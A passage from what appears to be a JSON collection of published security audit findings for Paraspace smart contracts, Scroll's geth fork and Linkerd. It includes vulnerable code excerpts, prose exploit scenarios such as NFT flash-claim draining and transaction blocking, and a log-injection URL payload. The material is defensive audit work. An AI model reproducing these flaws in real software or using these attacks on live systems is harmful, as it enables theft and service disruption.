Incorrect accounting in _transferCollaterizable ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf", "body": "The _transferCollaterizable function mishandles the collaterizedBalance and _isUsedAsCollateral elds. At a minimum, this means that transferred tokens cannot be used as collateral. The code for _transferCollaterizable appears in gure 9.1. It is called from Ntoken._transfer (gure 9.2). The code decreases _userState[from].collaterizedBalance and clears _isUsedAsCollateral[tokenId]. However, the code does not make any corresponding changes, such as increasing _userState[to].collaterizedBalance and setting _isUsedAsCollateral[tokenId] elsewhere. As a result, if Alice transfers her NToken to Bob, Bob will not be able to use the corresponding ERC721 token as collateral. function _transferCollaterizable( address from, address to, uint256 tokenId ) internal virtual returns (bool isUsedAsCollateral_) { isUsedAsCollateral_ = _isUsedAsCollateral[tokenId]; if (from != to && isUsedAsCollateral_) { _userState[from].collaterizedBalance -= 1; delete _isUsedAsCollateral[tokenId]; } MintableIncentivizedERC721._transfer(from, to, tokenId); } Figure 9.1: contracts/protocol/tokenization/base/MintableIncentivizedERC721.sol#L643 L656 function _transfer( address from, address to, uint256 tokenId, bool validate ) internal { address underlyingAsset = _underlyingAsset; uint256 fromBalanceBefore = collaterizedBalanceOf(from); uint256 toBalanceBefore = collaterizedBalanceOf(to); bool isUsedAsCollateral = _transferCollaterizable(from, to, tokenId); ... } Figure 9.2: contracts/protocol/tokenization/NToken.sol#L300L324 The code used to verify the bug appears in gure 9.3. The code rst veries that the collaterizedBalance and _isUsedAsCollateral elds are set correctly. It then has User 1 send his or her token to User 2, who sends it back to User 1. Finally, it veries that the collaterizedBalance and _isUsedAsCollateral elds are set incorrectly. Most subsequent tests fail thereafter. it(\"User 1 sends the nToken to User 2, who sends it back to User 1\", async () => { const { nBAYC, users: [user1, user2], } = testEnv; expect(await nBAYC.isUsedAsCollateral(0)).to.be.equal(true); expect(await nBAYC.collaterizedBalanceOf(user1.address)).to.be.equal(1); expect(await nBAYC.collaterizedBalanceOf(user2.address)).to.be.equal(0); await nBAYC.connect(user1.signer).transferFrom(user1.address, user2.address, 0); await nBAYC.connect(user2.signer).transferFrom(user2.address, user1.address, 0); expect(await nBAYC.isUsedAsCollateral(0)).to.be.equal(false); expect(await nBAYC.collaterizedBalanceOf(user1.address)).to.be.equal(0); expect(await nBAYC.collaterizedBalanceOf(user2.address)).to.be.equal(0); }); it(\"User 2 deposits 10k DAI and User 1 borrows 8K DAI\", async () => { Figure 9.3: This is the code used to verify the bug. The highlighted line appears in the ntoken.spec.ts le. What precedes it was added to that le. Exploit Scenario Alice, a Paraspace user, maintains several accounts. Alice transfers an NToken from one of her accounts to another. She tries to borrow against the NTokens corresponding ERC721 token but is unable to. Alice misses a nancial opportunity while trying to determine the source of the error. Recommendations Short term, implement one of the following two options:  Correct the accounting errors in the code in gure 9.1. (We experimented with this but were not able to determine all of the necessary changes.) Correcting the accounting errors will help ensure that users observe predictable behavior regarding NTokens.  Disallow the transferring of assets that have been registered as collateral. If a user is to be surprised by her NTokens behavior, it is better that it happen sooner (when the user tries to transfer) than later (when the user tries to borrow). Long term, expand the tests in ntoken.spec.ts to include scenarios such as transferring NTokens among users. Including such tests could help to uncover similar bugs. Note that ntoken.spec.ts includes at least one broken test (gure 9.3). The token ID passed to nBAYC.transferFrom should be 0, not 1. Furthermore, the test checks for the wrong error message. It should be Health factor is lesser than the liquidation threshold, not ERC721: operator query for nonexistent token. it(\"User 1 tries to send the nToken to User 2 (should fail)\", async () => { const { nBAYC, users: [user1, user2], } = testEnv; await expect( nBAYC.connect(user1.signer).transferFrom(user1.address, user2.address, 1) ).to.be.revertedWith(\"ERC721: operator query for nonexistent token\"); }); Figure 9.4: test-suites/ntoken.spec.ts#L74L83", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "10. IPriceOracle interface is used only in tests ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf", "body": "The IPriceOracle interface is used only in tests, yet it appears alongside production code. Its location increases the risk that a developer will try to use it in production code. The complete interface appears in gure 10.1. Note that the interface includes code that a real oracle is unlikely to include, such as the setAssetPrice function. Therefore, a developer that calls this function would likely introduce a bug into the code. // SPDX-License-Identifier: AGPL-3.0 pragma solidity 0.8.10; /** * @title IPriceOracle * * @notice Defines the basic interface for a Price oracle. **/ interface IPriceOracle { /** * @notice Returns the asset price in the base currency * @param asset The address of the asset * @return The price of the asset **/ function getAssetPrice(address asset) external view returns (uint256); /** * @notice Set the price of the asset * @param asset The address of the asset * @param price The price of the asset **/ function setAssetPrice(address asset, uint256 price) external; } Figure 10.1: contracts/interfaces/IPriceOracle.sol Exploit Scenario Alice, a Paraspace developer, uses the IPriceOracle interface in production code. Alices contract tries to call the setAssetPrice method. When the vulnerable code path is exercised, Alices contract reverts unexpectedly. Recommendations Short term, move IPriceOracle.sol to a location that makes it clear that it should be used in testing code only. Adjust all references to the le accordingly. Doing so will reduce the risk that the le is used in production code. Long term, as new code is added to the codebase, maintain segregation between production and testing code. Testing code is typically not held to the same standards as production code. Calling testing code from production code could introduce bugs.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "11. Manual ERC721 transfers could be claimed as NTokens by anyone ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf", "body": "The PoolCore contract has an external function supplyERC721FromNToken, whose purpose is to validate that the given ERC721 assets are owned by the NToken contract and then to mint the corresponding NTokens to a caller-supplied address. We suspect that the intended use case for this function is that the NTokenMoonBirds or UniswapV3Gateway contract will transfer the ERC721 assets to the NToken contract and then immediately call supplyERC721FromNToken. However, the access controls on this function allow an unauthorized user to take ownership of any assets manually transferred to the NToken contract, for whatever reason that may be, as NToken does not track the original owner of the asset. function supplyERC721FromNToken( address asset, DataTypes.ERC721SupplyParams[] calldata tokenData, address onBehalfOf ) external virtual override nonReentrant { SupplyLogic.executeSupplyERC721FromNToken( // ... ); } Figure 11.1: The external supplyERC721FromNToken function within PoolCore function validateSupplyFromNToken( DataTypes.ReserveCache memory reserveCache, DataTypes.ExecuteSupplyERC721Params memory params, DataTypes.AssetType assetType ) internal view { // ... for (uint256 index = 0; index < amount; index++) { // validate that the owner of the underlying asset is the NToken contract require( IERC721(params.asset).ownerOf( params.tokenData[index].tokenId ) == reserveCache.xTokenAddress, Errors.NOT_THE_OWNER ); // validate that the owner of the ntoken that has the same tokenId is the zero address require( IERC721(reserveCache.xTokenAddress).ownerOf( params.tokenData[index].tokenId ) == address(0x0), Errors.NOT_THE_OWNER ); } } Figure 11.2: The validation checks performed by supplyERC721FromNToken function executeSupplyERC721Base( uint16 reserveId, address nTokenAddress, DataTypes.UserConfigurationMap storage userConfig, DataTypes.ExecuteSupplyERC721Params memory params ) internal { // ... bool isFirstCollaterarized = INToken(nTokenAddress).mint( params.onBehalfOf, params.tokenData ); // ... } Figure 11.3: The unauthorized minting operation Users regularly interact with the NToken contract, which represents ERC721 assets, so it is possible that a malicious actor could convince users to transfer their ERC721 assets to the contract in an unintended manner. Exploit Scenario Alice, an unaware owner of some ERC721 assets, is convinced to transfer her assets to the NToken contract (or transfers them on her own accord, unaware that she should not). A malicious third party mints NTokens from Alices assets and withdraws them to his own account. Recommendations Short term, document the purpose and use of the NToken contract to ensure that users are unambiguously aware that ERC721 tokens are not meant to be sent directly to the NToken contract. Long term, consider whether supplyERC721FromNToken should have more access controls around it. Additional access controls could prevent attackers from taking ownership of any incorrectly transferred asset. In particular, this function is called from only two locations, so a msg.sender whitelist could be sucient. Additionally, if possible, consider adding additional metadata to the contract to track the original owner of ERC721 assets, and consider providing a mechanism for transferring any asset without a corresponding NToken back to the original owner.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "12. Inconsistent behavior between NToken and PToken liquidations ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf", "body": "When a user liquidates another users ERC20 tokens and opts to receive PTokens, the PTokens are automatically registered as collateral. However, when a user liquidates another users ERC721 token and opts to receive an NToken, the NToken is not automatically registered as collateral. This discrepancy could be confusing for users. The relevant code appears in gures 12.1 through 12.3. For ERC20 tokens, _liquidatePTokens is called, which in turns calls setUsingAsCollateral if the liquidator has not already designated the PTokens as collateral (gures 12.1 and 12.2). However, for an ERC721 token, the NToken is simply transferred (gure 12.3). if (params.receiveXToken) { _liquidatePTokens(usersConfig, collateralReserve, params, vars); } else { Figure 12.1: contracts/protocol/libraries/logic/LiquidationLogic.sol#L310L312 function _liquidatePTokens( mapping(address => DataTypes.UserConfigurationMap) storage usersConfig, DataTypes.ReserveData storage collateralReserve, DataTypes.ExecuteLiquidationCallParams memory params, LiquidationCallLocalVars memory vars ) internal { ... if (liquidatorPreviousPTokenBalance == 0) { DataTypes.UserConfigurationMap storage liquidatorConfig = usersConfig[vars.liquidator]; liquidatorConfig.setUsingAsCollateral(collateralReserve.id, true); emit ReserveUsedAsCollateralEnabled( params.collateralAsset, vars.liquidator ); } } Figure 12.2: contracts/protocol/libraries/logic/LiquidationLogic.sol#L667L693 if (params.receiveXToken) { INToken(vars.collateralXToken).transferOnLiquidation( params.user, vars.liquidator, params.collateralTokenId ); } else { Figure 12.3: contracts/protocol/libraries/logic/LiquidationLogic.sol#L562L568 Exploit Scenario Alice, a Paraspace user, liquidates several ERC721 tokens. Alice comes to expect that received NTokens are not designated as collateral. Eventually, Alice liquidates another users ERC20 tokens and opts to receive PTokens. Bob liquidates Alices PTokens, and Alice loses the underlying ERC20 tokens as a result. Recommendations Short term, conspicuously document the fact that PToken and NToken liquidations behave dierently. Doing so will reduce the likelihood that users will be surprised by the inconsistency. Long term, consider whether the behavior should be made consistent. That is, decide whether NTokens and PTokens should be automatically collateralized on liquidation, and implement such behavior for both types of tokens. A consistent API is less likely to be a source of errors.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "13. Missing asset type checks in ValidationLogic library ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf", "body": "Some validation functions involving assets do not check the given assets type. Such checks should be added to ensure defense in depth. The validateRepay function is one example (gure 13.1). The function performs several checks involving the asset being repaid, but the function does not check that the asset is an ERC20 asset. function validateRepay( DataTypes.ReserveCache memory reserveCache, uint256 amountSent, DataTypes.InterestRateMode interestRateMode, address onBehalfOf, uint256 stableDebt, uint256 variableDebt ) internal view { ... (bool isActive, , , , bool isPaused, ) = reserveCache .reserveConfiguration .getFlags(); require(isActive, Errors.RESERVE_INACTIVE); require(!isPaused, Errors.RESERVE_PAUSED); ... } Figure 13.1: contracts/protocol/libraries/logic/ValidationLogic.sol#L403L447 Another example is the validateFlashloanSimple function, which does not check that the loaned asset is an ERC20 asset. We do not believe that the absence of these checks currently represents a vulnerability. However, adding these checks will help protect the code against future modications. Exploit Scenario Alice, a Paraspace developer, implements a feature allowing users to ash loan ERC721 tokens to other users in exchange for a fee. Alice uses the validateFlashloanSimple function as a template for implementing the new validation code. Therefore, Alices additions lack a check that the loaned assets are actually ERC721 assets. Some users lose ERC20 tokens as a result. Recommendations Short term, ensure that each validation function involving assets veries the type of the asset involved. Doing so will help protect the code against future modications. Long term, regularly review all conditionals involving asset types to verify that they handle all applicable asset types correctly. Doing so will help to identify problems involving the handling of dierent asset types.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "14. Uniswap v3 NFT ash claims may lead to undercollateralization ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf", "body": "Flash claims enable users with collateralized NFTs to assume ownership of the underlying asset for the duration of a single transaction, with the condition that the NFT be returned at the end of the transaction. When used with typical NFTs, such as Bored Ape Yacht Club tokens, the atomic nature of ash claims prevents users from removing net value from the Paraspace contract while enabling them to claim rewards, such as airdrops, that they are entitled to by virtue of owning the NFTs. Uniswap v3 NFTs represent a position in a Uniswap liquidity pool and entitle the owner to add or withdraw liquidity from the underlying Uniswap position. Uniswap v3 NFT prices are determined by summing the value of the two ERC20 tokens deposited as liquidity in the underlying position. Normally, when a Uniswap NFT is deposited in the Uniswap NToken contract, the user can withdraw liquidity only if the resulting price leaves the users health factor above one. However, by leveraging the ash claim system, a user could claim the Uniswap v3 NFT temporarily and withdraw liquidity directly, returning a valueless NFT. As currently implemented, Paraspace is not vulnerable to this attack because Uniswap v3 ash claims are, apparently accidentally, nonfunctional. A check in the onERC721Recieved function of the NTokenUniswapV3 contract, which is designed to prevent users from depositing Uniswap positions via the supplyERC721 method, incidentally prevents Uniswap NFTs from being returned to the contract during the ash claim process. However, this check could be removed in future updates and occurs at the very last step in what would otherwise be a successful exploit. function onERC721Received( address operator, address, uint256 id, bytes memory ) external virtual override returns (bytes4) { // ... // if the operator is the pool, this means that the pool is transferring the token to this contract // which can happen during a normal supplyERC721 pool tx if (operator == address(POOL)) { revert(Errors.OPERATION_NOT_SUPPORTED); } Figure 14.1: The failing check that prevents the completion of Uniswap v3 ash claims Exploit Scenario Alice, a Paraspace developer, decides to move the check that prevents users from depositing Uniswap v3 NFTs via the supplyERC721 method out of the onERC721Received function and into the Paraspace Pool contract. She thus unwittingly enables ash claims for Uniswap v3 positions. Bob, a malicious actor, then deposits a Uniswap NFT worth 100 ETH and borrows 30 ETH against it. Bob ash claims the NFT and withdraws the 100 ETH of liquidity, leaving a worthless NFT as collateral and taking the 30 ETH as prot. Recommendations Short term, disable Uniswap v3 NFT ash claims explicitly by requiring in ValidationLogic.validateFlashClaim that the ash claimed NFT not be atomically priced. Long term, consider adding a user healthFactor check after the return phase of the ash claim process to ensure that users cannot become undercollateralized as a result of ash claims.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "15. Non-injective hash encoding in getClaimKeyHash ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance2.pdf", "body": "As part of the ash claim functionality, Paraspace provides an implementation of a contract that can claim airdrops on behalf of NFT holders. This contract tracks claimed airdrops in the airdropClaimRecords mapping, indexed by the result of the getClaimKeyHash function. However, it is possible for two dierent inputs to getClaimKeyHash to result in identical hashes through a collision in the unpacked encoding. Because nftTokenIds and params are both variable-length inputs, an input with nftTokenIds equal to uint256(1) and an empty params will hash to the same value as an input with an empty nftTokenIds and params equal to uint256(1). Although the airdropClaimRecords mapping is not read or otherwise referenced elsewhere in the code, collisions may cause o-chain clients to mistakenly believe that an unclaimed airdrop has already been claimed. function getClaimKeyHash( address initiator, address nftAsset, uint256[] calldata nftTokenIds, bytes calldata params ) public pure returns (bytes32) { return keccak256( abi.encodePacked(initiator, nftAsset, nftTokenIds, params) ); } Figure 15.1: contracts/misc/flashclaim/AirdropFlashClaimReceiver.sol#L247257 Exploit Scenario Paraspace develops an o-chain tool to help users automatically claim airdrops for their NFTs. By chance or through malfeasance, two dierent airdrop claim operations for the same nftAsset result in the same claimKeyHash. The tool then mistakenly believes that it has claimed both airdrops when, in reality, it claimed only one. Recommendations Short term, encode the input to keccak256 using abi.encode in order to preserve boundaries between inputs. Long term, consider using an EIP-712 compatible structured hash encoding with domain separation wherever hashes will be used as unique identiers or signed messages.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "1. Attacker can prevent L2 transactions from being added to a block ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-securityreview.pdf", "body": "The commitTransactions function returns a ag that determines whether to halt transaction production, even if the block has room for more transactions to be added. If the circuit checker returns an error either for row consumption being too high or reasons unknown, the circuitCapacityReached ag is set to true (gure 1.1). case (errors.Is(err, circuitcapacitychecker.ErrTxRowConsumptionOverflow) && tx.IsL1MessageTx()): // Circuit capacity check: L1MessageTx row consumption too high, shift to the next from the account, // because we shouldn't skip the entire txs from the same account. // This is also useful for skipping \"problematic\" L1MessageTxs. queueIndex := tx.AsL1MessageTx().QueueIndex log.Trace(\"Circuit capacity limit reached for a single tx\", \"tx\", tx.Hash().String(), \"queueIndex\", queueIndex) log.Info(\"Skipping L1 message\", \"queueIndex\", queueIndex, \"tx\", tx.Hash().String(), \"block\", w.current.header.Number, \"reason\", \"row consumption overflow\") w.current.nextL1MsgIndex = queueIndex + 1 // after `ErrTxRowConsumptionOverflow`, ccc might not revert updates // associated with this transaction so we cannot pack more transactions. // TODO: fix this in ccc and change these lines back to `txs.Shift()` circuitCapacityReached = true break loop case (errors.Is(err, circuitcapacitychecker.ErrTxRowConsumptionOverflow) && !tx.IsL1MessageTx()): // Circuit capacity check: L2MessageTx row consumption too high, skip the account. // This is also useful for skipping \"problematic\" L2MessageTxs. log.Trace(\"Circuit capacity limit reached for a single tx\", \"tx\", tx.Hash().String()) // after `ErrTxRowConsumptionOverflow`, ccc might not revert updates // associated with this transaction so we cannot pack more transactions. // TODO: fix this in ccc and change these lines back to `txs.Pop()` circuitCapacityReached = true break loop case (errors.Is(err, circuitcapacitychecker.ErrUnknown) && tx.IsL1MessageTx()): // Circuit capacity check: unknown circuit capacity checker error for L1MessageTx, // shift to the next from the account because we shouldn't skip the entire txs from the same account queueIndex := tx.AsL1MessageTx().QueueIndex log.Trace(\"Unknown circuit capacity checker error for L1MessageTx\", \"tx\", tx.Hash().String(), \"queueIndex\", queueIndex) log.Info(\"Skipping L1 message\", \"queueIndex\", queueIndex, \"tx\", tx.Hash().String(), \"block\", w.current.header.Number, \"reason\", \"unknown row consumption error\") w.current.nextL1MsgIndex = queueIndex + 1 // after `ErrUnknown`, ccc might not revert updates associated // with this transaction so we cannot pack more transactions. // TODO: fix this in ccc and change these lines back to `txs.Shift()` circuitCapacityReached = true break loop case (errors.Is(err, circuitcapacitychecker.ErrUnknown) && !tx.IsL1MessageTx()): // Circuit capacity check: unknown circuit capacity checker error for L2MessageTx, skip the account log.Trace(\"Unknown circuit capacity checker error for L2MessageTx\", \"tx\", tx.Hash().String()) // after `ErrUnknown`, ccc might not revert updates associated // with this transaction so we cannot pack more transactions. // TODO: fix this in ccc and change these lines back to `txs.Pop()` circuitCapacityReached = true break loop Figure 1.1: Error handling for the circuit capacity checker (worker.go#L1073-L1121) When this ag is set to true, no new transactions will be added even if there is room for additional transactions in the block (gure 1.2). // Fill the block with all available pending transactions. pending := w.eth.TxPool().Pending(true) // Short circuit if there is no available pending transactions. // But if we disable empty precommit already, ignore it. Since // empty block is necessary to keep the liveness of the network. if len(pending) == 0 && pendingL1Txs == 0 && atomic.LoadUint32(&w.noempty) == 0 { w.updateSnapshot() return } // Split the pending transactions into locals and remotes localTxs, remoteTxs := make(map[common.Address]types.Transactions), pending for _, account := range w.eth.TxPool().Locals() { if txs := remoteTxs[account]; len(txs) > 0 { delete(remoteTxs, account) localTxs[account] = txs } } var skipCommit, circuitCapacityReached bool if w.chainConfig.Scroll.ShouldIncludeL1Messages() && len(l1Txs) > 0 { log.Trace(\"Processing L1 messages for inclusion\", \"count\", pendingL1Txs) txs := types.NewTransactionsByPriceAndNonce(w.current.signer, l1Txs, header.BaseFee) skipCommit, circuitCapacityReached = w.commitTransactions(txs, w.coinbase, interrupt) if skipCommit { return } } if len(localTxs) > 0 && !circuitCapacityReached { txs := types.NewTransactionsByPriceAndNonce(w.current.signer, localTxs, header.BaseFee) skipCommit, circuitCapacityReached = w.commitTransactions(txs, w.coinbase, interrupt) if skipCommit { return } } if len(remoteTxs) > 0 && !circuitCapacityReached { txs := types.NewTransactionsByPriceAndNonce(w.current.signer, remoteTxs, header.BaseFee) // don't need to get `circuitCapacityReached` here because we don't have further `commitTransactions` // after this one, and if we assign it won't take effect (`ineffassign`) skipCommit, _ = w.commitTransactions(txs, w.coinbase, interrupt) if skipCommit { return } } // do not produce empty blocks if w.current.tcount == 0 { return } w.commit(uncles, w.fullTaskHook, true, tstart) Figure 1.2: Pending transactions are not added if the circuit capacity has been reached. (worker.go#L1284-L1332) Exploit Scenario Eve, an attacker, sends an L2 transaction that uses ecrecover many times. The transaction is provided to the mempool with enough gas to be the rst L2 transaction in the blockchain. Because this causes an error in the circuit checker, it prevents all other L2 transactions from being executed in this block. Recommendations Short term, implement a snapshotting mechanism in the circuit checker to roll back unexpected changes made as a result of incorrect or incomplete computation. Long term, analyze and document all impacts of error handling across the system to ensure that these errors are handled gracefully. Additionally, clearly document all expected invariants of how the system is expected to behave to ensure that in interactions with other components, these invariants hold throughout the system.", "labels": ["Trail of Bits", "Severity: High", "Difficulty: Low"]}, {"title": "2. Unused and dead code ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-securityreview.pdf", "body": "Due to the infrastructure setup of this network and the use of a single node clique setup, this fork of geth contains a signicant amount of unused logic. Continuing to maintain this code can be problematic and may lead to issues. The following are examples of unused and dead code:  Uncle blockswith a single node clique network, there is no chance for uncle blocks to exist, so all the logic that handles and interacts with uncle blocks can be dropped.  Redundant logic around updating the L1 queue index  A redundant check on empty blocks in the worker.go le Recommendations Short term, remove anything that is no longer relevant for the current go-etheruem implementation and be sure to document all the changes to the codebase. Long term, remove all unused code from the codebase.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "3. Lack of documentation ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-scrollL2geth-securityreview.pdf", "body": "Certain areas of the codebase lack documentation, high-level descriptions, and examples, which makes the contracts dicult to review and increases the likelihood of user mistakes. Areas that would benet from being expanded and claried in code and documentation include the following:  Internals of the CCC. Despite being treated as a black box, the code relies on stateful changes made from geth calls. This suggests that the internal states of the miner's work and the CCC overlap. The lack of documentation regarding these states creates a lack of visibility in evaluating whether there are potential state corruptions or unexpected behavior.  Circumstances where transactions are skipped and how they are expected to be handled. During the course of the review, we attempted to reverse engineer the intended behavior of transactions considered skipped by the CCC. The lack of documentation in these areas results in unclear expectations for this code.  Error handling standard throughout the system. The codebase handles system errors dierentlyin some cases, logging an error and continuing execution or logging traces. Listing out all instances where errors are identied and documenting how they are handled can help ensure that there is no unexpected behavior related to error handling. The documentation should include all expected properties and assumptions relevant to the aforementioned aspects of the codebase. Recommendations Short term, review and properly document the aforementioned aspects of the codebase. In addition to external documentation, NatSpec and inline code comments could help clarify complexities. Long term, consider writing a formal specication of the protocol. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: N/A"]}, {"title": "1. Various unhandled errors ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf", "body": "The linkerd codebase contains various methods with unhandled errors. In most cases, errors returned by functions are simply not checked; in other cases, functions that surround deferred error-returning functions do not capture the relevant errors. Using gosec and errcheck, we detected a large number of such cases, which we cannot enumerate in this report. We recommend running these tools to uncover and resolve these cases. Figures 1.1 and 1.2 provide examples of functions in the codebase with unhandled errors: func (h *handler) handleProfileDownload(w http.ResponseWriter, req *http.Request, params httprouter.Params) { [...] w.Write(profileYaml.Bytes()) } Figure 1.1: web/srv/handlers.go#L65-L91 func renderStatStats(rows []*pb.StatTable_PodGroup_Row, options *statOptions) string { [...] writeStatsToBuffer(rows, w, options) w.Flush() [...] } Figure 1.2: viz/cmd/stat.go#L295-L302 We could not determine the severity of all of the unhandled errors detected in the codebase. Exploit Scenario While an operator of the Linkerd infrastructure interacts with the system, an uncaught error occurs. Due to the lack of error reporting, the operator is unaware that the operation did not complete successfully, and he produces further undened behavior. Recommendations Short term, run gosec and errcheck across the codebase. Resolve all issues pertaining to unhandled errors by checking them explicitly. Long term, ensure that all functions that return errors have explicit checks for these errors. Consider integrating the abovementioned tooling into the CI/CD pipeline to prevent undened behavior from occurring in the aected code paths.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: High"]}, {"title": "2. The use of time.After() in select statements can lead to memory leaks ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf", "body": "Calls to time.After in for/select statements can lead to memory leaks because the garbage collector does not clean up the underlying Timer object until the timer res. A new timer, which requires resources, is initialized at each iteration of the for loop (and, hence, the select statement). As a result, many routines originating from the time.After call could lead to overconsumption of the memory. wait: for { select { case result := <-resultChan: results = append(results, result) case <-time.After(waitingTime): break wait // timed out } if atomic.LoadInt32(&activeRoutines) == 0 { break } } Figure 2.1: cli/cmd/metrics_diagnostics_util.go#L131-L142 Recommendations Short term, consider refactoring the code that uses the time.After function in for/select loops using tickers. This will prevent memory leaks and crashes caused by memory exhaustion. Long term, ensure that the time.After method is not used in for/select routines. Periodically use the Semgrep query to check for and detect similar patterns. References  Use with caution time.After Can cause memory leak (golang)  Golang <-time.After() is not garbage collected before expiry", "labels": ["Trail of Bits", "Severity: Low", "Difficulty: High"]}, {"title": "3. Use of string.Contains instead of string.HasPrex to check for prexes ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf", "body": "When formatting event metadata, the formatMetadata method checks whether a given string in the metadata map contains a given prex. However, rather than using string.HasPrefix to perform this check, it uses string.Contains, which returns true if the given prex string is located anywhere in the target string. for k, v := range meta { if strings.Contains(k, consts.Prefix) || strings.Contains(k, consts.ProxyConfigAnnotationsPrefix) { metadata = append(metadata, fmt.Sprintf(\"%s=%s\", k, v)) } } Figure 3.1: multicluster/service-mirror/events_formatting.go#L23-L27 Recommendations Short term, refactor the prex checks to use string.HasPrefix rather than string.Contains. This will ensure that prexes within strings are properly validated.", "labels": ["Trail of Bits", "Severity: Undetermined", "Difficulty: Undetermined"]}, {"title": "4. Risk of resource exhaustion due to the use of defer inside a loop ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf", "body": "The runCheck function, responsible for performing health checks for various services, performs its core functions inside of an innite for loop. runCheck is called with a timeout stored in a context object. The cancel() function is deferred at the beginning of the loop. Calling defer inside of a loop could cause resource exhaustion conditions because the deferred function is called when the function exits, not at the end of each loop. As a result, resources from each context object are accumulated until the end of the for statement. While this may not cause noticeable issues in the current state of the application, it is best to call cancel() at the end of each loop to prevent unforeseen issues. func (hc *HealthChecker) runCheck(category *Category, c *Checker, observer CheckObserver) bool { for { ctx, cancel := context.WithTimeout(context.Background(), RequestTimeout) defer cancel() err := c.check(ctx) if se, ok := err.(*SkipError); ok { log.Debugf(\"Skipping check: %s. Reason: %s\", c.description, se.Reason) return true } Figure 4.1: pkg/healthcheck/healthcheck.go#L1619-L1628 Recommendations Short term, rather than deferring the call to cancel(), add a call to cancel() at the end of the loop.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "5. Lack of maximum request and response body constraint ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf", "body": "The ioutil.ReadAll function reads from source until an error or an end-of-le (EOF) condition occurs, at which point it returns the data that it read. There is no limit on the maximum size of request and response bodies, so using ioutil.ReadAll to parse requests and responses could cause a denial of service (due to insucient memory). A denial of service could also occur if an exhaustive resource is loaded multiple times. This method is used in the following locations of the codebase: File Purpose controller/heartbeat/heartbeat.go:239 Reads responses for heartbeat requests pkg/profiles/openapi.go:32 pkg/version/channels.go:83 controller/webhook/server.go:124 pkg/protohttp/protohttp.go:48 pkg/protohttp/protohttp.go:170 Reads the body of le for the profile command Reads responses from requests for obtaining Linkerd versions Reads requests for the webhook and metrics servers Reads all requests sent to the metrics and TAP APIs Reads error responses from the metrics and TAP APIs In the case of pkg/protohttp/protohttp.go, the readAll function can be called to read POST requests, making it easier for an attacker to exploit the misuse of the ReadAll function. Recommendations Short term, place a limit on the maximum size of request and response bodies. For example, this limitation can be implemented by using the io.LimitReader function. Long term, place limits on request and response bodies globally in other places within the application to prevent denial-of-service attacks.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "6. Potential goroutine leak in Kubernetes port-forwarding initialization logic ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf", "body": "The Init function responsible for initializing port-forwarding connections for Kubernetes causes a goroutine leak when connections succeed. This is because the failure channel in the Init function is set up as an unbuered channel. Consequently, the failure channel blocks the execution of the anonymous goroutine in which it is used unless an error is received from pf.run(). Whenever a message indicating success is received by readChan, the Init function returns without rst releasing the resources allocated by the anonymous goroutine, causing those resources to be leaked. func (pf *PortForward) Init() error { // (...) failure := make(chan error) go func() { if err := pf.run(); err != nil { failure <- err } }() // (...)` select { case <-pf.readyCh: log.Debug(\"Port forward initialised\") case err := <-failure: log.Debugf(\"Port forward failed: %v\", err) return err } Figure 6.1: pkg/k8s/portforward.go#L200-L220 Recommendations Short term, make the failure channel a buered channel of size 1. That way, the goroutine will be cleaned and destroyed when the function returns regardless of which case occurs rst. Long term, run GCatch against goroutine-heavy packages to detect the mishandling of channel bugs. Refer to appendix C for guidance on running GCatch. Basic instances of this issue can also be detected by running this Semgrep rule.", "labels": ["Trail of Bits", "Severity: Informational", "Difficulty: High"]}, {"title": "7. Risk of log injection in TAP service API ", "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Linkerd-securityreview.pdf", "body": "Requests sent to the TAP service API endpoint, /apis/tap, via the POST method are handled by the handleTap method. This method parses a namespace and a name obtained from the URL of the request. Both the namespace and name variables are then used in a log statement for printing debugging messages to standard output. Because both elds are user controllable, an attacker could perform log injection attacks by calling such API endpoints with a namespace or name with newline indicators, such as \\n. func (h *handler) handleTap(w http.ResponseWriter, req *http.Request, p httprouter.Params) { namespace := p.ByName(\"namespace\") name := p.ByName(\"name\") resource := \"\" // (...) h.log.Debugf(\"SubjectAccessReview: namespace: %s, resource: %s, name: %s, user: <%s>, group: <%s>\", namespace, resource, name, h.usernameHeader, h.groupHeader, ) Figure 7.1: viz/tap/api/handlers.go#L106-L125 Exploit Scenario An attacker submits a POST request to the TAP service API using the URL /apis/tap.linkerd.io/v1alpha1/watch/myns\\nERRO[0000]<attackers log message>/tap, causing invalid logs to be 